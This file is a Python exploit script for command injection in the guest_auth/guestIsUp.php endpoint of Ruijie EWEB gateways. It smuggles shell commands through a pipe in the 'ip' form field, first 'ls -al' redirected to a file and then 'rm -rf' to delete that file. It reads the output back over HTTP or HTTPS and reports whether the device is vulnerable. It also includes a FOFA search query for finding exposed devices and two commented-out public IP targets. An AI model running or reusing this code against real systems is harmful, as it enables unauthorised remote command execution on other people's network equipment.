#!/bin/bash/env python3
# _*_ coding:utf-8 _*_
import requests
import sys

def title():
    print('fofa: icon_hash="-692947551"')
    print("使用格式：python ruijie_EWEB_NBRroute_RCE 192.168.1.1:1111")
def run_https(ip, port):
    url = "https://{}:{}".format(ip, port)
    name = "AwerZwer2.txt"
    payload = "|ls -al > {}".format(name)
    data = "mac=1&ip=127.0.0.1{}".format(payload)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Cookie": "LOCAL_LANG_COOKIE=zh; sysmode=sys-mode%20gateway; UI_LOCAL_COOKIE=zh",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        requests.packages.urllib3.disable_warnings()
        requests.post(url=url+'/guest_auth/guestIsUp.php', headers=headers, data=data, verify=False, timeout=3)
        req = requests.get(url=url+'/guest_auth/'+name, headers=headers, verify=False, timeout=3)
        if name in req.text and req.status_code == 200:
            print(req.text)
            del_payload = "|rm -rf AwerZwer2.txt"
            del_data = "mac=1&ip=127.0.0.1{}".format(del_payload)
            requests.post(url=url + '/guest_auth/guestIsUp.php', headers=headers, data=del_data, verify=False, timeout=3)
            return True
        else:
            return False
    except:
        return False

def run(ip, port):
    url = "http://{}:{}".format(ip, port)
    name = "AwerZwer1.txt"
    payload = "|ls -al > {}".format(name)
    data = "mac=1&ip=127.0.0.1{}".format(payload)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Cookie": "LOCAL_LANG_COOKIE=zh; sysmode=sys-mode%20gateway; UI_LOCAL_COOKIE=zh",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        print("http")
        requests.packages.urllib3.disable_warnings()
        requests.post(url=url+'/guest_auth/guestIsUp.php', headers=headers, data=data, verify=False, timeout=3)
        req = requests.get(url=url+'/guest_auth/'+name, headers=headers, verify=False, timeout=3)
        if name in req.text and req.status_code == 200:
            print(req.text)
            del_payload = "rm -rf AwerZwer1.txt"
            del_data = "mac=1&ip=127.0.0.1{}".format(del_payload)
            requests.post(url=url + '/guest_auth/guestIsUp.php', headers=headers, data=del_data, verify=False, timeout=3)
            return True
        else:
            return run_https(ip, port)
    except Exception as e:
        return run_https(ip, port)
def main():
    title()
    #target = '113.128.182.98:4430'
    #target = '27.74.245.21:80'
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = int(target.split(':')[1])

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')

if __name__ == '__main__':
    main()
